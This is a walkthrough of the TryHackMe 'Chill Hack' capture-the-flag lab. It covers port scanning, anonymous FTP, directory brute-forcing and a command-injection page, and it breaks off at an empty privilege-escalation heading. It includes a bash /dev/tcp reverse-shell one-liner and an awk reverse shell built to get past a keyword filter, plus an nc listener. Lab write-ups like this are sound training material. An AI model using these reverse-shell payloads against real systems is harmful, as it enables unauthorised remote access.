# CHill-Hack-CTF
A step by step walk through for the Chill Hack CTF on Tryhackme

---

Link: https://tryhackme.com/room/chillhack

---

# Enumeration

Lets begin with nmap, a popular enumeration tool!

more here: https://www.kali.org/tools/nmap/

Command: `nmap <machine_ip> -sV -sC -p-` (*We use -sV to determine the service version of the services running on the open ports and we use -p- to scan all ports, because by default nmap only scans 1000 ports, we can change it to scan all 65,000 using -p-*)

Anways! Lets look at our results

![image](https://github.com/traveller404/CHill-Hack-CTF/assets/92340426/592c02b6-0eff-4f13-bd0e-a455d6db8973)

We see that there are 3 ports running, port 21, 22 and 80, and we also see that port 21 allows anonymous login, this means we can login with the username of anonymousm and provide no password, we simpyl just hit enter when queried for a password

On login, there is just 1 file, "**note.txt**", we can download this to our local machine using `mget *`

![image](https://github.com/traveller404/CHill-Hack-CTF/assets/92340426/f7ea9271-86f5-4a19-8a84-ca827491ff19)

When we open this file up using `cat note.txt` we are told there is something that is filtering certain strings that is being put in the command, we still dont know what this is but lets continue, and its from a someone called Apaar

# The webserver

Seeing as there is nowhere else to go other than the website, because port 22 is always alot more secure, we see that the webserver is hosting a template page of some sorts, and any links just lead nowhere

We can now try to scan for other directories or subdomains with dirb, or gobuster, I will use gobuster as it is alot faster and can scan for more subdomains

Command | `gobuster dir -u http://<machine_ip> -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt`

![image](https://github.com/traveller404/CHill-Hack-CTF/assets/92340426/c0f9e73f-fe50-4ef4-895c-4dbc109d0bd6)

We are led to a subdomain of /secret and on going to this we are prompted for a command, this is very insecure as attackers can execute malicious code on the host machine, seeing passwords or other harmful information

If you try to using basic commands like `ls` we are asked if we are a hacker.

![image](https://github.com/traveller404/CHill-Hack-CTF/assets/92340426/f1d0784e-e7d8-455f-9796-069854696f01)

I kept guessing commands until I used whoami, this gave me a positive response saying we are www-data, which is a pretty common username for webserver users

Realizing we cant access any more information using the webserver command prompt interface, we are going to try execute some code that can give us a reverse shell

Using a basic bash reverse shell : `sh -i >& /dev/tcp/10.18.49.141/9001 0>&1` wil give nothing because once again the words are being filtered out, my guess is that there is a script running that filters out key words like bash, nc, ls, python etc and blocks them before ever reaching the actual command line, so to bypass this we can try to use whitespaces. Whitespaces, in short, are certain characters or strings of letters, that register as basically nothing, and basically correspond to nothing but can bypass certain firewalls that block certain words, I found that the command `awk 'BEGIN {s = "/inet/tcp/0/<machine_ip>/<port>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null` worked for me but I'm sure there are other commands that can bypass this, now all I have to do is use nc to set up a listner so `rlwrap nc -lvp <port>`

# Shell and Privesc
